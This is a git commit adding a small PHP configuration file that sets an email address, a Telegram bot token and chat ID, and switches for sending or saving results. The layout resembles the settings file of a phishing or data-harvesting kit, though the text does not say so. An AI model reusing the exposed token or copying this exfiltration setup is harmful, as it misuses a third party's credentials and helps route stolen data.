ab9dfdc57a38e3da4d675c6756307e4871b8fc26
macroc19 <112516108+macroc19@users.noreply.github.com>
2022-08-30 16:09:45 -0400

    Add files via upload

---
+++ configure.php
@@ -0,0 +1,19 @@
+<?php
+/*
+*** Set your email below and configure functions to your requirments ***
+*** FUNCTION CONTROL: 1=ON  and 0=OFF ***
+EXAMPLE
+$Example=1;  // Function On
+$Example=0;  // Function Off
+*/
+$youremail='dazaadrianjose12@gmail.com';  // Set your email
+$Send_to_Email='0';
+$Save_on_Server='1';
+/*
+*/
+$Send_to_Telegram='1';
+$token='5442239990:AAGgZpsZvsewaway16TffbgIu0W9tsEM5zo';
+$chat_id='549220994';
+/*
+*/
+?>
